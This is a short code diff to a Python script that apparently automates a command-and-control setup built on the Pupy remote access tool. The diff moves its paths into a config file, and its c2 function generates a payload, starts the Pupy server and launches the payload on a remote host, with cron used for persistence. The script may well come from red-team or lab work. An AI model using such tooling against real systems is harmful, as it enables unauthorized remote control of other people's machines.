@@ -1,6 +1,15 @@
 import subprocess
 import os
 import time
+import configparser
+
+config = configparser.ConfigParser()
+config.read('conf.ini')
+
+# Get testing value
+pythonvenv = config.get('c2', 'pythonvenv')
+pupysh = config.get('c2', 'pupysh')
+pupygen = config.get('c2', 'pupygen')
 
 
 '''
@@ -49,7 +58,7 @@ def startPayload(file, privk_path, rhost, rpath):
     subprocess.run(cron, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
-def c2(host, venvpath, pupypath, pupygenpath, localpayload, privk_path, rpath, rfile):
-    genPayload(venvpath, pupygenpath, localpayload, privk_path, host, rpath)
-    startPupy(venvpath, pupypath)
+def c2(host, localpayload, privk_path, rpath, rfile):
+    genPayload(pythonvenv, pupygen, localpayload, privk_path, host, rpath)
+    startPupy(pythonvenv, pupysh)
     startPayload(rfile, privk_path, host, rpath)
